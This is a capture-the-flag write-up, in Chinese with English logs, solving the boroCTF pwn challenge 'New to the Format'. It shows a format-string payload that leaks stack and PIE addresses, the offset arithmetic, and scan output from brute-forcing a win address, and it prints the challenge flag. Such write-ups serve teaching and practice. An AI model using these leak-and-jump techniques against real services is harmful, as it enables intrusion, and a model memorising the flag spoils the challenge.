# New to the Format

## 題目描述

Sometimes it takes a large % of effort to achieve little. But we all start somewhere, right? The things you learn at the beginning ultimately shape the skills you build in the end.

```text
nc w56ll430yihy.boroctf.com 47845
```

## 解題思路

1. **第一步**：

    連上伺服器後，會跳出：

    ```text
    Say what you want but the route will only reveal itself if you format it correctly.
    1111111111111
    1111111111111

    I know how to get there, but where do i go?
    0
    ```

    這題是 format string 的題目，經過測試後，第一個問題可以拿來 leak PIE base，第二個問題可以拿來輸入 win address 拿 flag。

    經過一段時間的嘗試，我拿到了以下資訊：

    ```text
    Say what you want but the route will only reveal itself if you format it correctly.
    %31$p.%32$p.%33$p.%34$p.%35$p.%36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p.%45$p
    0x7fffffffedf8.(nil).0x426c2f7c2d481b4a.0x7fffffffedf8.0x555555555209.0x555555557d90.0x7ffff7ffd040.0xbd93d083f4aa1b4a.0xbd93c0cab7c21b4a.0x7fff00000000.(nil).(nil).(nil).(nil).0x296e6b21504b7c00
    ```

    用常見的 PIE base 來算：

    ```text
    0x555555555209 - 0x555555554000 = 0x1209
    ```

    主函式大概在 0x1200 附近。

2. **第二步**：

    寫了一個腳本，掃一遍 0x1100 到 0x1400 (間隔 0x10)，發現：

    ```text
    [+] Opening connection to w56ll430yihy.boroctf.com on port 47845: Done
    [+] Receiving all data: Done (130B)
    [] Closed connection to w56ll430yihy.boroctf.com port 
    478450x1120 0x555555555120 b'Say what you want but the route will only reveal itself if you format it correctly.\n\n\nI know how to '
    ...
    [+] Opening connection to w56ll430yihy.boroctf.com on port 47845: Done
    [+] Receiving all data: Done (44B)
    [] Closed connection to w56ll430yihy.boroctf.com port 
    478450x12c0 0x5555555552c0 b'** stack smashing detected **: terminated\n'
    ...
    [+] Opening connection to w56ll430yihy.boroctf.com on port 47845: Done
    [+] Receiving all data: Done (52B)
    [] Closed connection to w56ll430yihy.boroctf.com port 
    478450x1320 0x555555555320 b'Fatal error: glibc detected an invalid stdio handle\n'
    ```

    程式主區段應該在 0x1100 到 0x1300，在 0x12c0 看起來是函式中後段，所以我從 0x1250 逐 byte 開始掃，在 0x12d0 附近拿到 flag。(忘記截圖或複製了)

## Flag

```text
boroCTF{%_0F_pEop!le}
```
